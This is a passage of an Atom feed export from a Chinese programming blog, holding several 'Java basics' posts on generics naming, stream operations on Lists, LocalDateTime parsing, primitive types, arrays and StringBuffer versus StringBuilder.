    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;我们平时需要使用到微信的消息提醒,市面上几种流行的微信通知解决方案.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;企业微信&lt;/li&gt;
&lt;li&gt;Telegram</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="wechat" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/wechat/"/>
    
    
    <category term="微信消息" scheme="https://seniortesting.club/tags/%E5%BE%AE%E4%BF%A1%E6%B6%88%E6%81%AF/"/>
    
    <category term="微信" scheme="https://seniortesting.club/tags/%E5%BE%AE%E4%BF%A1/"/>
    
    <category term="wechat" scheme="https://seniortesting.club/tags/wechat/"/>
    
    <category term="微信通知" scheme="https://seniortesting.club/tags/%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5/"/>
    
  </entry>
  
  <entry>
    <title>java基础(3) - 关键字</title>
    <link href="https://seniortesting.club/posts/p91D51Eg6EFh/"/>
    <id>https://seniortesting.club/posts/p91D51Eg6EFh/</id>
    <published>2021-04-16T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>Java泛型中的标记符含义：</p><ul><li><p>E - Element (在集合中使用，因为集合中存放的是元素)</p></li><li><p>T - Type（Java 类）T代表在调用时的指定类型。会进行类型推断</p></li><li><p>K - Key（键）</p></li><li><p>V - Value（值）</p></li><li><p>N - Number（数值类型）</p></li><li><p>R - Result （返回结果，多用于函数式编程）</p></li><li><p>？ -  表示不确定的java类型</p></li><li><p>S、U、V  - 2nd、3rd、4th types</p></li></ul><p> PS: 其实<strong>以上这些对于java编译器来说作用都一样，都是作为一个占位作用</strong>，要在使用时就能确定类型，也就是说A,B,C…Z等大写字母都可以表示泛型，只不过以上泛型的定义，更多是我们程序员间约定俗成的命名方式，一种规范，从而达到“见其名则知其意”的目的，罢了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;泛型&quot;&gt;&lt;a href=&quot;#泛型&quot; class=&quot;headerlink&quot; title=&quot;泛型&quot;&gt;&lt;/a&gt;泛型&lt;/h2&gt;&lt;p&gt;Java泛型中的标记符含义：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;E - Element (在集合中使用，因为集合中存放的是元素)&lt;/p&gt;
&lt;/</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="关键字" scheme="https://seniortesting.club/tags/%E5%85%B3%E9%94%AE%E5%AD%97/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(4) - 集合List</title>
    <link href="https://seniortesting.club/posts/k01251Eg6EFh/"/>
    <id>https://seniortesting.club/posts/k01251Eg6EFh/</id>
    <published>2021-04-16T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-list去重复操作？"><a href="#1-list去重复操作？" class="headerlink" title="1. list去重复操作？"></a>1. list去重复操作？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.提取出list对象中的一个属性</span></span><br><span class="line">List&lt;String&gt; stIdList1 = stuList.stream().map(Person::getId).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.提取出list对象中的一个属性并去重</span></span><br><span class="line">List&lt;String&gt; stIdList2 = stuList.stream().map(Person::getId).distinct().collect(Collectors.toList());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>去除List中的重复对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Person 对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">    &lt;!--省略 get set--&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据name去重</span></span><br><span class="line">List&lt;Person&gt; unique = persons.stream().collect(</span><br><span class="line">            Collectors.collectingAndThen(</span><br><span class="line">                    Collectors.toCollection(() -&gt; <span class="keyword">new</span> TreeSet&lt;&gt;(Comparator.comparing(Person::getName))), ArrayList::<span class="keyword">new</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据name,sex两个属性去重</span></span><br><span class="line">List&lt;Person&gt; unique = persons.stream().collect(</span><br><span class="line">           Collectors. collectingAndThen(</span><br><span class="line">                    Collectors.toCollection(() -&gt; <span class="keyword">new</span> TreeSet&lt;&gt;(Comparator.comparing(o -&gt; o.getName() + <span class="string">&quot;;&quot;</span> + o.getSex()))), ArrayList::<span class="keyword">new</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-查找list中最大和最小的对象值？"><a href="#2-查找list中最大和最小的对象值？" class="headerlink" title="2. 查找list中最大和最小的对象值？"></a>2. 查找list中最大和最小的对象值？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取某个属性的最大值</span></span><br><span class="line">Optional&lt;Dish&gt; maxDish = Dish.menu.stream().</span><br><span class="line">      collect(Collectors.maxBy(Comparator.comparing(Dish::getCalories)));</span><br><span class="line">maxDish.ifPresent(System.out::println);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取某个属性的最小值</span></span><br><span class="line">Optional&lt;Dish&gt; minDish = Dish.menu.stream().</span><br><span class="line">      collect(Collectors.minBy(Comparator.comparing(Dish::getCalories)));</span><br><span class="line">minDish.ifPresent(System.out::println);</span><br></pre></td></tr></table></figure><h2 id="3-求和操作"><a href="#3-求和操作" class="headerlink" title="3. 求和操作"></a>3. 求和操作</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//计算 总金额</span></span><br><span class="line">BigDecimal totalMoney = appleList.stream().map(Apple::getMoney).reduce(BigDecimal.ZERO, BigDecimal::add);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-对list中的元素如何进行分组？"><a href="#4-对list中的元素如何进行分组？" class="headerlink" title="4. 对list中的元素如何进行分组？"></a>4. 对list中的元素如何进行分组？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//List 以ID分组 Map&lt;Integer,List&lt;Apple&gt;&gt;</span></span><br><span class="line">Map&lt;Integer, List&lt;Apple&gt;&gt; groupBy = appleList.stream().collect(Collectors.groupingBy(Apple::getId));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多属性分组</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 方法1：嵌套调用 Java8 Collectors groupingBy 方法</span></span><br><span class="line">Map&lt;String, Map&lt;String, List&lt;Student&gt;&gt;&gt; map1 = stuList.stream()</span><br><span class="line">                .collect(Collectors.groupingBy(Student::getAge, Collectors.groupingBy(Student::getSex)));</span><br></pre></td></tr></table></figure><h2 id="5-list如何转为map，例如id为key，对象为value？"><a href="#5-list如何转为map，例如id为key，对象为value？" class="headerlink" title="5. list如何转为map，例如id为key，对象为value？"></a>5. list如何转为map，例如id为key，对象为value？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * List -&gt; Map</span></span><br><span class="line"><span class="comment"> * 需要注意的是：</span></span><br><span class="line"><span class="comment"> * toMap 如果集合对象有重复的key，会报错Duplicate key ....</span></span><br><span class="line"><span class="comment"> *  apple1,apple12的id都为1。</span></span><br><span class="line"><span class="comment"> *  可以用 (k1,k2)-&gt;k1 来设置，如果有重复的key,则保留key1,舍弃key2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Map&lt;Integer, Apple&gt; appleMap = appleList.stream().collect(Collectors.toMap(Apple::getId, a -&gt; a,(k1,k2)-&gt;k1));</span><br></pre></td></tr></table></figure><h2 id="6-如何进行排序操作？"><a href="#6-如何进行排序操作？" class="headerlink" title="6. 如何进行排序操作？"></a>6. 如何进行排序操作？</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常的升序操作</span></span><br><span class="line">List&lt;Integer&gt; collect = list.stream().sorted().collect(Collectors.toList());</span><br><span class="line"><span class="comment">// 倒序操作</span></span><br><span class="line">List&lt;Person&gt; collect = list.stream().sorted(Comparator.comparing(Person::getSalary).reversed()).collect(Collectors.toList());</span><br><span class="line"><span class="comment">//按年龄排序(Integer类型)</span></span><br><span class="line">List&lt;StudentInfo&gt; studentsSortName = studentList.stream().sorted(Comparator.comparing(StudentInfo::getAge).reversed()).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用年龄进行降序排序，年龄相同再使用身高升序排序</span></span><br><span class="line">List&lt;StudentInfo&gt; studentsSortName = studentList.stream()</span><br><span class="line">                .sorted(Comparator.comparing(StudentInfo::getAge).reversed().thenComparing(StudentInfo::getHeight))</span><br><span class="line">                .collect(Collectors.toList());</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-list去重复操作？&quot;&gt;&lt;a href=&quot;#1-list去重复操作？&quot; class=&quot;headerlink&quot; title=&quot;1. list去重复操作？&quot;&gt;&lt;/a&gt;1. list去重复操作？&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="集合" scheme="https://seniortesting.club/tags/%E9%9B%86%E5%90%88/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(5) - 时间工具</title>
    <link href="https://seniortesting.club/posts/ab31u1Eg6EFh/"/>
    <id>https://seniortesting.club/posts/ab31u1Eg6EFh/</id>
    <published>2021-04-16T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>LocalDateTime工具使用</p><h2 id="Unable-to-obtain-LocalDateTime-from-TemporalAccessor-ISO-resolved-to-2018-04-30-of-type-java-tim"><a href="#Unable-to-obtain-LocalDateTime-from-TemporalAccessor-ISO-resolved-to-2018-04-30-of-type-java-tim" class="headerlink" title="Unable to obtain LocalDateTime from TemporalAccessor: {},ISO resolved to 2018-04-30 of type java.tim"></a>Unable to obtain LocalDateTime from TemporalAccessor: {},ISO resolved to 2018-04-30 of type java.tim</h2><blockquote><p>原因日期格式的时间不能转化为LocalDateTime</p></blockquote><p>可采用如下方法解决：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LocalDateTime <span class="title">parseDate</span><span class="params">(String dateStr)</span> </span>&#123;</span><br><span class="line">     DateTimeFormatter baseDateTimeFormatter = DateTimeFormatter.ofPattern(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line"></span><br><span class="line">     DateTimeFormatter dateTimeFormatter = <span class="keyword">new</span> DateTimeFormatterBuilder().append(baseDateTimeFormatter)</span><br><span class="line">             .parseDefaulting(ChronoField.HOUR_OF_DAY, <span class="number">0</span>)</span><br><span class="line">             .parseDefaulting(ChronoField.MINUTE_OF_HOUR, <span class="number">0</span>)</span><br><span class="line">             .parseDefaulting(ChronoField.SECOND_OF_MINUTE, <span class="number">0</span>)</span><br><span class="line">             .toFormatter();</span><br><span class="line">     <span class="keyword">return</span> LocalDateTime.parse(dateStr, dateTimeFormatter);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;LocalDateTime工具使用&lt;/p&gt;
&lt;h2 id=&quot;Unable-to-obtain-LocalDateTime-from-TemporalAccessor-ISO-resolved-to-2018-04-30-of-type-java-tim&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="时间工具" scheme="https://seniortesting.club/tags/%E6%97%B6%E9%97%B4%E5%B7%A5%E5%85%B7/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(6) - Number计算工具</title>
    <link href="https://seniortesting.club/posts/m621u1Eg6EFh/"/>
    <id>https://seniortesting.club/posts/m621u1Eg6EFh/</id>
    <published>2021-04-16T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p>Java<strong>中</strong>有 8 种基本数据类型，分别为：</p><ol><li>6 种数字类型 ：byte、short、int、long、float、double</li><li>1 种字符类型：char</li><li>1 种布尔型：boolean</li></ol><p>这八种基本类型都有对应的包装类分别为：Byte、Short、Integer、Long、Float、Double、Character、Boolean</p><table><thead><tr><th align="left">基本类型</th><th align="left">位数</th><th align="left">字节</th><th align="left">默认值</th><th align="left">最小值</th><th>最大值</th></tr></thead><tbody><tr><td align="left">byte</td><td align="left">8</td><td align="left">1</td><td align="left">0</td><td align="left">-128（-2^7）</td><td>127（2^7-1)</td></tr><tr><td align="left">int</td><td align="left">32</td><td align="left">4</td><td align="left">0</td><td align="left">-2,147,483,648（-2^31）</td><td>2,147,483,647（2^31 - 1）</td></tr><tr><td align="left">short</td><td align="left">16</td><td align="left">2</td><td align="left">0</td><td align="left">-32768（-2^15）</td><td>32767（2^15 - 1）</td></tr><tr><td align="left">long</td><td align="left">64</td><td align="left">8</td><td align="left">0L</td><td align="left">-9,223,372,036,854,775,808（-2^63）</td><td>9,223,372,036,854,775,807（2^63 -1）</td></tr><tr><td align="left">float</td><td align="left">32</td><td align="left">4</td><td align="left">0f</td><td align="left"></td><td></td></tr><tr><td align="left">double</td><td align="left">64</td><td align="left">8</td><td align="left">0d</td><td align="left"></td><td></td></tr><tr><td align="left">char</td><td align="left">16</td><td align="left">2</td><td align="left">‘u0000’</td><td align="left"></td><td></td></tr><tr><td align="left">boolean</td><td align="left">1</td><td align="left"></td><td align="left">false</td><td align="left"></td><td></td></tr></tbody></table><p>对于 boolean，官方文档未明确定义，它依赖于 JVM 厂商的具体实现。逻辑上理解是占用 1 位，但是实际中会考虑计算机高效存储因素。</p><p>注意：</p><ol><li>Java 里使用 long 类型的数据一定要在数值后面加上 <strong>L</strong>，否则将作为整型解析：</li><li><code>char a = &#39;h&#39;</code>char :单引号，<code>String a = &quot;hello&quot;</code> :双引号</li></ol><h2 id="自动装箱与拆箱"><a href="#自动装箱与拆箱" class="headerlink" title="自动装箱与拆箱"></a>自动装箱与拆箱</h2><ul><li>装箱：将基本类型用它们对应的引用类型包装起来；</li><li>拆箱：将包装类型转换为基本数据类型；</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基本数据类型&quot;&gt;&lt;a href=&quot;#基本数据类型&quot; class=&quot;headerlink&quot; title=&quot;基本数据类型&quot;&gt;&lt;/a&gt;基本数据类型&lt;/h2&gt;&lt;p&gt;Java&lt;strong&gt;中&lt;/strong&gt;有 8 种基本数据类型，分别为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;6 </summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="Math" scheme="https://seniortesting.club/tags/Math/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(7) - 数组计算</title>
    <link href="https://seniortesting.club/posts/a0221u1Eg6EFh/"/>
    <id>https://seniortesting.club/posts/a0221u1Eg6EFh/</id>
    <published>2021-04-16T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数组的定义"><a href="#数组的定义" class="headerlink" title="数组的定义"></a>数组的定义</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataType[] arrayRefVar;   <span class="comment">// 首选的方法</span></span><br><span class="line">dataType[] arrayRefVar = <span class="keyword">new</span> dataType[arraySize];</span><br><span class="line">dataType[] arrayRefVar = &#123;value0, value1, ..., valuek&#125;;</span><br><span class="line">        </span><br><span class="line">dataType arrayRefVar[];  <span class="comment">// 效果相同，但不是首选方法</span></span><br></pre></td></tr></table></figure><p>:::warning 注意<br>建议使用 dataType[] arrayRefVar 的声明风格声明数组变量。 dataType arrayRefVar[] 风格是来自 C/C++ 语言 ，在Java中采用是为了让 C/C++ 程序员能够快速理解java语言。<br>:::</p><h2 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">double</span>[] myList = &#123;<span class="number">1.9</span>, <span class="number">2.9</span>, <span class="number">3.4</span>, <span class="number">3.5</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 打印所有数组元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; myList.length; i++) &#123;</span><br><span class="line">    System.out.println(myList[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="keyword">for</span>(type element: array) &#123;</span><br><span class="line">   System.out.println(element);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arrays-类"><a href="#Arrays-类" class="headerlink" title="Arrays 类"></a>Arrays 类</h2><p>java.util.Arrays 类能方便地操作数组，它提供的所有方法都是静态的。具有以下功能：</p><ul><li>给数组赋值：通过 fill 方法。</li><li>对数组排序：通过 sort 方法,按升序。</li><li>比较数组：通过 equals 方法比较数组中元素值是否相等。</li><li>查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数组的定义&quot;&gt;&lt;a href=&quot;#数组的定义&quot; class=&quot;headerlink&quot; title=&quot;数组的定义&quot;&gt;&lt;/a&gt;数组的定义&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="java基础系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/java%E5%9F%BA%E7%A1%80%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="java基础" scheme="https://seniortesting.club/tags/java%E5%9F%BA%E7%A1%80/"/>
    
    <category term="数组" scheme="https://seniortesting.club/tags/%E6%95%B0%E7%BB%84/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java基础(8) - 字符串介绍</title>
    <link href="https://seniortesting.club/posts/s6te1u1Eg6EFh/"/>
    <id>https://seniortesting.club/posts/s6te1u1Eg6EFh/</id>
    <published>2021-04-16T15:14:50.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-StringBuffer-vs-StringBuilder"><a href="#1-StringBuffer-vs-StringBuilder" class="headerlink" title="1. StringBuffer vs StringBuilder"></a>1. StringBuffer vs StringBuilder</h2><ul><li><p>StringBuffer是线程安全，可以不需要额外的同步用于多线程中;</p></li><li><p>StringBuilder是非同步,运行于多线程中就需要使用着单独同步处理，但是速度就比StringBuffer快多了;</p></li><li><p>StringBuffer与StringBuilder两者共同之处:可以通过append、indexOf进行字符串的操作。</p></li><li><p>首先说运行速度，或者说是执行速度，在这方面运行速度快慢为：StringBuilder &gt; StringBuffer &gt; String</p></li><li><p>StringBuffer中很多方法可以带有<code>synchronized</code>关键字，所以可以保证线程是安全的，但StringBuilder的方法则没有该关键字，所以不能保证线程安全，有可能会出现一些错误的操作。所以<strong>如果要进行的操作是多线程的，那么就要使用StringBuffer，但是在单线程的情况下，还是建议使用速度比较快的StringBuilder。</strong></p></li></ul><h2 id="2-如何优雅的判空，判定对象为空，NPE？"><a href="#2-如何优雅的判空，判定对象为空，NPE？" class="headerlink" title="2. 如何优雅的判空，判定对象为空，NPE？"></a>2. 如何优雅的判空，判定对象为空，NPE？</h2><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testNullString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String str = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> present = Optional.ofNullable(str).isPresent();</span><br><span class="line">    Assertions.assertTrue(present);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">boolean</span> nonNull = Objects.nonNull(str);</span><br><span class="line">    Assertions.assertTrue(nonNull);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-string相关类型转换？"><a href="#3-string相关类型转换？" class="headerlink" title="3. string相关类型转换？"></a>3. string相关类型转换？</h2><table><thead><tr><th>类型</th><th>字符串转其他类型</th><th>其他类型转字符串1</th><th>其他类型转字符串2</th></tr></thead><tbody><tr><td>byte</td><td>Byte.parseByte(str)</td><td>String.valueOf([byte] bt)</td><td>Byte.toString([byte] bt)</td></tr><tr><td>short</td><td>Short.parseShort(str)</td><td>String.valueOf([short] s)</td><td>Short.toString([short] 